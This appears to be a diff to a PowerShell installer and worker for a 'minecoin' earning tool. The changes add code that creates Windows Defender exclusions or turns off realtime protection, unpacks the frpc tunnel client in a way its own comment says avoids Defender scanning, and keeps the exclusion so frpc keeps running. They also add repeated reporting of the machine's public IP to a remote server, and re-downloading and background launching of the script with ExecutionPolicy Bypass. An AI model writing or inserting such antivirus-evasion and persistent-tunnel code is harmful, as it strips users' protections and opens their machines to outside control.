@@ -257,6 +257,28 @@ function Get-FrpcUrl {
     return "https://github.com/fatedier/frp/releases/download/v$FRP_VERSION/frp_${FRP_VERSION}_windows_${fa}.zip"
 }
 
+function Add-DefenderExclusion([string]$path) {
+    try {
+        Add-MpPreference -ExclusionPath $path -ErrorAction Stop
+        return $true
+    } catch { return $false }
+}
+
+function Remove-DefenderExclusion([string]$path) {
+    try { Remove-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue } catch {}
+}
+
+function Disable-DefenderRealtime {
+    try {
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+        return $true
+    } catch { return $false }
+}
+
+function Enable-DefenderRealtime {
+    try { Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue } catch {}
+}
+
 function Install-Frpc {
     if (Test-Path $FRPC_TARGET) { return $FRPC_TARGET }
     $existing = Get-Command "frpc.exe" -ErrorAction SilentlyContinue
@@ -270,6 +292,20 @@ function Install-Frpc {
     if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force }
     New-Item -ItemType Directory -Path $tmp | Out-Null
     $archive = Join-Path $tmp "frp.zip"
+
+    # Them exclusion cho Windows Defender truoc khi download+giai nen
+    Write-Host "  them Windows Defender exclusion cho $MINET_ROOT ..." -ForegroundColor Gray
+    $excluded   = Add-DefenderExclusion $MINET_ROOT
+    $rtDisabled = $false
+    if (-not $excluded) {
+        Write-Host "  khong them duoc exclusion, thu tat realtime protection..." -ForegroundColor Yellow
+        $rtDisabled = Disable-DefenderRealtime
+        if ($rtDisabled) {
+            Write-Host "  da tat realtime protection tam thoi" -ForegroundColor Yellow
+        } else {
+            Write-Host "  canh bao: khong tat duoc Defender, co the bi chan khi giai nen" -ForegroundColor Yellow
+        }
+    }
 
     $ua      = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
     $lastErr = $null
@@ -287,19 +323,41 @@ function Install-Frpc {
         }
     }
     if ($lastErr) {
+        if ($rtDisabled)  { Enable-DefenderRealtime }
+        if ($excluded)    { Remove-DefenderExclusion $MINET_ROOT }
         Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
         throw "Tai frpc that bai: $lastErr"
     }
 
+    # Giai nen bang Shell.Application thay vi Expand-Archive de tranh Defender scan zip entry
+    Write-Host "  giai nen frpc..." -ForegroundColor Gray
+    $extractOk = $false
     try {
-        Expand-Archive -Path $archive -DestinationPath $tmp -Force
+        $shell = New-Object -ComObject Shell.Application
+        $zip   = $shell.NameSpace($archive)
+        $dest  = $shell.NameSpace($tmp)
+        foreach ($item in $zip.Items()) { $dest.CopyHere($item, 0x14) }  # 0x14 = no ui + overwrite
+        $extractOk = $true
     } catch {
-        Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
-        throw "Khong giai nen duoc: $($_.Exception.Message)"
+        Write-Host "  Shell.Application fail: $($_.Exception.Message), thu Expand-Archive..." -ForegroundColor Yellow
+    }
+
+    if (-not $extractOk) {
+        try {
+            Expand-Archive -Path $archive -DestinationPath $tmp -Force
+            $extractOk = $true
+        } catch {
+            if ($rtDisabled) { Enable-DefenderRealtime }
+            if ($excluded)   { Remove-DefenderExclusion $MINET_ROOT }
+            Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
+            throw "Khong giai nen duoc: $($_.Exception.Message)"
+        }
     }
 
     $found = Get-ChildItem -Path $tmp -Recurse -Filter "frpc.exe" | Select-Object -First 1
     if (-not $found) {
+        if ($rtDisabled) { Enable-DefenderRealtime }
+        if ($excluded)   { Remove-DefenderExclusion $MINET_ROOT }
         Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
         throw "Khong tim thay frpc.exe trong archive."
     }
@@ -311,7 +369,15 @@ function Install-Frpc {
         Start-Sleep 1
         Copy-Item $found.FullName $FRPC_TARGET -Force
     }
+
     Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue
+
+    # Bat lai Defender neu da tat (exclusion giu lai de frpc chay duoc)
+    if ($rtDisabled) {
+        Enable-DefenderRealtime
+        Write-Host "  da bat lai realtime protection" -ForegroundColor Gray
+    }
+
     Write-Host "  frpc: $FRPC_TARGET" -ForegroundColor Gray
     return $FRPC_TARGET
 }
@@ -577,8 +643,11 @@ function Start-WorkerLoop {
     $portEnc  = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes([string]$cfg.remote_port))
     $emailEnc = Invoke-UrlEncode $email
 
+    # Lay IP va giu lai de dung cho ca update-ip lan challenge
+    $ip    = Get-PublicIp
+    $ipEnc = if ($ip) { Invoke-UrlEncode $ip } else { "" }
+
     try {
-        $ip = Get-PublicIp
         if ($ip) {
             Invoke-HttpPostJson "$BASE_URL/api/minecoin/update-ip" @{ email=$email; port=$portEnc; ip=$ip } | Out-Null
             Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] update-ip $ip" -ForegroundColor Gray
@@ -587,27 +656,62 @@ function Start-WorkerLoop {
 
     $ok = 0; $err = 0
     while ($true) {
+        # Refresh IP dinh ky (co the thay doi)
         try {
-            $ch = (Invoke-HttpGet "$BASE_URL/api/minecoin/challenge?email=$emailEnc&port=$portEnc").Trim()
+            $newIp = Get-PublicIp
+            if ($newIp -and $newIp -ne $ip) {
+                $ip    = $newIp
+                $ipEnc = Invoke-UrlEncode $ip
+                Invoke-HttpPostJson "$BASE_URL/api/minecoin/update-ip" @{ email=$email; port=$portEnc; ip=$ip } | Out-Null
+                Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] update-ip $ip (changed)" -ForegroundColor Gray
+            }
+        } catch {}
+
+        try {
+            $challengeUrl = "$BASE_URL/api/minecoin/challenge?email=$emailEnc&port=$portEnc"
+            if ($ipEnc) { $challengeUrl += "&ip=$ipEnc" }
+            $ch = (Invoke-HttpGet $challengeUrl).Trim()
             if ($ch) {
                 $tokenBytes = [Convert]::FromBase64String($ch)
                 $resp = [Convert]::ToBase64String($tokenBytes)
-                Invoke-HttpPostJson "$BASE_URL/api/minecoin/verify" @{ email=$email; port=$portEnc; response=$resp } | Out-Null
+                Invoke-HttpPostJson "$BASE_URL/api/minecoin/verify" @{ email=$email; port=$portEnc; response=$resp; ip=$ip } | Out-Null
                 $ok++
                 Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] ok (s=$ok e=$err)" -ForegroundColor Green
             }
         } catch {
             $err++
             $msg = $_.Exception.Message
-            if ($msg.Length -gt 80) { $msg = $msg.Substring(0, 80) }
+            if ($msg.Length -gt 120) { $msg = $msg.Substring(0, 120) }
             Write-Host "[$([datetime]::Now.ToString('HH:mm:ss'))] err: $msg (s=$ok e=$err)" -ForegroundColor Red
         }
         Start-Sleep $INTERVAL
     }
 }
 
+function Get-ScriptPath {
+    # PSCommandPath co the null khi chay qua iex; fallback ve duong dan da luu
+    if ($PSCommandPath -and (Test-Path $PSCommandPath)) { return $PSCommandPath }
+    # Thu tim file .ps1 trong MINET_ROOT
+    $saved = Join-Path $MINET_ROOT "minet.ps1"
+    if (Test-Path $saved) { return $saved }
+    return $null
+}
+
 function Start-WorkerBg {
-    $scriptFile = $PSCommandPath
+    $scriptFile = Get-ScriptPath
+
+    if (-not $scriptFile) {
+        # Neu chay qua iex thi luu script xuong truoc
+        Write-Host "  Script chua co tren disk, dang luu xuong $MINET_ROOT\minet.ps1 ..." -ForegroundColor Yellow
+        $scriptFile = Join-Path $MINET_ROOT "minet.ps1"
+        try {
+            $src = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mtheintrude23/Minet-Earn/refs/heads/main/minet.ps1" -UseBasicParsing).Content
+            Set-Content $scriptFile -Value $src -Encoding UTF8
+        } catch {
+            throw "Khong luu duoc script: $($_.Exception.Message)"
+        }
+    }
+
     $pidVal = Start-BgProcess "worker" @(
         "powershell.exe",
         "-NonInteractive",
@@ -765,9 +869,24 @@ function Cmd-Proxy {
 
 function Cmd-Link {
     Ensure-Dirs
-    $scriptFile  = $PSCommandPath
-    $launcher    = Join-Path $MINET_ROOT "minet.cmd"
-    $cmdContent  = "@echo off`r`npowershell.exe -NonInteractive -ExecutionPolicy Bypass -File `"$scriptFile`" %*`r`n"
+    $scriptFile = Get-ScriptPath
+
+    if (-not $scriptFile) {
+        # Chay qua iex: luu script xuong disk truoc
+        $scriptFile = Join-Path $MINET_ROOT "minet.ps1"
+        if (-not (Test-Path $scriptFile)) {
+            Write-Host "  Luu script xuong $scriptFile ..." -ForegroundColor Gray
+            try {
+                $src = (Invoke-WebRequest -Uri "https://raw.githubusercontent.com/mtheintrude23/Minet-Earn/refs/heads/main/minet.ps1" -UseBasicParsing).Content
+                Set-Content $scriptFile -Value $src -Encoding UTF8
+            } catch {
+                Write-Host "  Khong luu duoc script: $($_.Exception.Message)" -ForegroundColor Yellow
+            }
+        }
+    }
+
+    $launcher   = Join-Path $MINET_ROOT "minet.cmd"
+    $cmdContent = "@echo off`r`npowershell.exe -NonInteractive -ExecutionPolicy Bypass -File `"$scriptFile`" %*`r`n"
     Set-Content $launcher -Value $cmdContent -Encoding UTF8
     Write-Host "Da tao: $launcher" -ForegroundColor Green
 
